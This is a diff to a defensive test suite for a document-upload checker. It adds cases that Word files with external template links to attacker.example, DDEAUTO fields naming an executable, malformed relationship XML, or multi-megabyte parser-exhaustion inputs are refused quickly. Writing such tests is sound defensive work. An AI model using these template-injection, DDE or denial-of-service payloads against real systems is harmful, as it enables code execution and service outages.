@@ -254,8 +254,9 @@ describe("Word and Excel content that runs or loads something without a macro", 
       `<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="Ext&#101;rnal"/>`,
       `<Relationship Id="rId1" Type='${R}/attachedTemplate' Target='https://attacker.example/' TargetMode = 'External' />`,
       `<pr:Relationship xmlns:pr="http://schemas.openxmlformats.org/package/2006/relationships" Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
-      // A hyperlink type with a second Type attribute is not one plain hyperlink.
-      `<Relationship Id="rId1" Type="${R}/hyperlink" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
+      // A hyperlink type with a second Type under another prefix is not one plain hyperlink. (The
+      // same name written twice is not XML at all, and is refused as malformed: see below.)
+      `<Relationship xmlns:x="urn:x" Id="rId1" Type="${R}/hyperlink" x:Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
     ]) {
       assert.equal(await refusal(docxWith([{ name: "word/_rels/settings.xml.rels", data: rels(relationship), deflate: true }])), "external_content", relationship);
     }
@@ -460,11 +461,32 @@ describe("inflating Word and Excel parts is bounded and fails closed", () => {
   });
   it("a relationships part that is not well-formed is refused", async () => {
     for (const data of [rels('<Relationship Id="rId1" Type="x" Target="y'), `<!DOCTYPE r [<!ENTITY e "External">]>${rels('<Relationship Id="rId1" Type="x" TargetMode="&e;"/>')}`,
-      rels('<!-- an unterminated comment <Relationship Id="rId1" TargetMode="External"/>'), rels("<Relationship Id=rId1/>")]) {
+      rels('<!-- an unterminated comment <Relationship Id="rId1" TargetMode="External"/>'), rels("<Relationship Id=rId1/>"),
+      // The same attribute twice is not XML, so which Type a reader keeps is not ours to guess.
+      rels(`<Relationship Id="rId1" Type="${R}/hyperlink" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`)]) {
       assert.equal(await refusal(docxWith([{ name: "word/_rels/settings.xml.rels", data, deflate: true }])), "malformed_document", data);
     }
   });
 });
+
+/**
+ * The verdict's reason ("null" when accepted), computed in a child process with a hard deadline,
+ * because a blocked event loop cannot time itself out. Each input below takes milliseconds on a
+ * linear check and minutes (or hours) on a quadratic one, so the deadline is far from both.
+ */
+function reasonWithinDeadline(bytes: Uint8Array, label: string): string {
+  const module = new URL("./team-hub-file-type.ts", import.meta.url).href;
+  const script = `import { teamHubFileVerdict } from ${JSON.stringify(module)};
+    const chunks = []; for await (const chunk of process.stdin) chunks.push(chunk);
+    const verdict = await teamHubFileVerdict(new Uint8Array(Buffer.concat(chunks)), ${JSON.stringify(DOCX)});
+    process.stdout.write(String(verdict.reason));`;
+  const child = spawnSync(process.execPath, [...process.execArgv.filter((flag) => !flag.startsWith("--test")), "--input-type=module", "-e", script],
+    { input: bytes, encoding: "utf8", timeout: 20_000 });
+  assert.equal(child.signal, null, `${label}: still running at the 20 s deadline`);
+  return child.stdout || `(no verdict) ${child.stderr}`;
+}
+const MB = 1024 * 1024;
+const repeatTo = (unit: string, length: number) => unit.repeat(Math.ceil(length / unit.length));
 
 describe("stripping comments, processing instructions and CDATA is linear and fails closed", () => {
   it("removing a construct cannot join its neighbours into a new opener", async () => {
@@ -474,19 +496,51 @@ describe("stripping comments, processing instructions and CDATA is linear and fa
   });
   it("a 2 MB part made of unterminated openers is refused at once, not after quadratic work", () => {
     // A regex that rescans to the end of the text for every unterminated `<!--` takes minutes on this
-    // (measured: 0.2 MB already took 4 s); the linear pass takes milliseconds. A child process with a
-    // hard deadline is used because a blocked event loop cannot time itself out.
-    const module = new URL("./team-hub-file-type.ts", import.meta.url).href;
-    const script = `import { teamHubFileVerdict } from ${JSON.stringify(module)};
-      const chunks = []; for await (const chunk of process.stdin) chunks.push(chunk);
-      const verdict = await teamHubFileVerdict(new Uint8Array(Buffer.concat(chunks)), ${JSON.stringify(DOCX)});
-      process.stdout.write(String(verdict.reason));`;
+    // (measured: 0.2 MB already took 4 s); the linear pass takes milliseconds.
     for (const opener of ["<!--", "<?", "<![CDATA["]) {
-      const bytes = withDocument(opener.repeat(Math.ceil((2 * 1024 * 1024) / opener.length)));
-      const child = spawnSync(process.execPath, [...process.execArgv.filter((flag) => !flag.startsWith("--test")), "--input-type=module", "-e", script],
-        { input: bytes, encoding: "utf8", timeout: 20_000 });
-      assert.equal(child.signal, null, `${opener}: still running at the 20 s deadline`);
-      assert.equal(child.stdout, "malformed_document", `${opener}: ${child.stderr}`);
+      assert.equal(reasonWithinDeadline(withDocument(repeatTo(opener, 2 * MB)), opener), "malformed_document", opener);
     }
+  });
+});
+
+// Each shape below fits in a few KB once compressed, and each took seconds at 0.1-0.2 MB of XML
+// before its path was made linear (measured under Deno, the edge runtime), so at 2 MB it would hold
+// the edge function far past its CPU limit and then ACCEPT the file.
+describe("reading field instructions and attributes is linear", () => {
+  it("many instrText opens sharing one close are refused at once", () => {
+    // Searching from every open to the one close at the end was quadratic (0.2 MB: 5.9 s).
+    const bytes = withDocument(repeatTo("<w:instrText>", 2 * MB) + "</w:instrText>");
+    assert.equal(reasonWithinDeadline(bytes, "shared close"), "malformed_document");
+  });
+  it("a field tag inside instruction text is refused: instrText holds only text", async () => {
+    assert.equal(await refusal(withDocument('<w:p><w:r><w:instrText>a<w:instrText>b</w:instrText></w:r></w:p>')), "malformed_document");
+    assert.equal(await refusal(withDocument('<w:p><w:r><w:instrText>a<w:fldChar w:fldCharType="end"/>b</w:instrText></w:r></w:p>')), "malformed_document");
+    // Back-to-back instruction pieces, each with its own close, are what Word writes, and still read.
+    await accepted(withDocument(ddeRun(" PAGE ") + '<w:p><w:r><w:instrText> A </w:instrText><w:instrText> B </w:instrText></w:r></w:p>'));
+  });
+  it("instruction text full of `<` with no `>` is read in one pass", () => {
+    // The tag-dropping regex rescanned to the end for every `<` (0.2 MB: 33 s), whether the `<` are
+    // bare or each start something that looks like a closing tag.
+    assert.equal(reasonWithinDeadline(withDocument("<w:instrText>" + repeatTo("<", 2 * MB) + "</w:instrText>"), "bare <"), "null");
+    assert.equal(reasonWithinDeadline(withDocument("<w:instrText>" + repeatTo("</w:instrText     ", 2 * MB) + "</w:instrText>"), "near-closes"), "null");
+  });
+  it("tags inside instruction text are still dropped the way they always were", async () => {
+    // A `<` with no `>` after it is text; a tag is dropped; so this spells DDEAUTO and is refused.
+    assert.equal(await refusal(withDocument(ddeRun("DD<w:t>EAUTO c:\\\\x.exe"))), "dde_field");
+    await accepted(withDocument(ddeRun(" PAGE <")));
+  });
+  it("one tag repeating an attribute name is refused at once, and repeats under different prefixes stay linear", () => {
+    // The attribute list was copied on every repeat (0.2 MB: 7.5 s). The same name twice is not XML.
+    assert.equal(reasonWithinDeadline(withDocument('<w:fldChar ' + repeatTo('a="1" ', 2 * MB) + "/>"), "same name"), "malformed_document");
+    // Different prefixes are legal XML and are all kept, so the list still grows: it must grow in place.
+    let prefixed = "";
+    for (let index = 0; prefixed.length < 2 * MB; index++) prefixed += `p${index}:a="1" `;
+    assert.equal(reasonWithinDeadline(withDocument(`<w:fldChar ${prefixed}/>`), "prefixed names"), "null");
+  });
+  it("a long blank instruction followed by many nested fields is read in one pass", () => {
+    // Every nested begin re-trimmed the parent's whole instruction (4 MB of it here, 2 MB took 8.7 s).
+    const pair = '<w:fldChar w:fldCharType="begin"/><w:fldChar w:fldCharType="end"/>';
+    const bytes = withDocument('<w:fldChar w:fldCharType="begin"/><w:instrText>x' + " ".repeat(4 * MB) + "</w:instrText>" + repeatTo(pair, 4 * MB));
+    assert.equal(reasonWithinDeadline(bytes, "nested after blank"), "null");
   });
 });
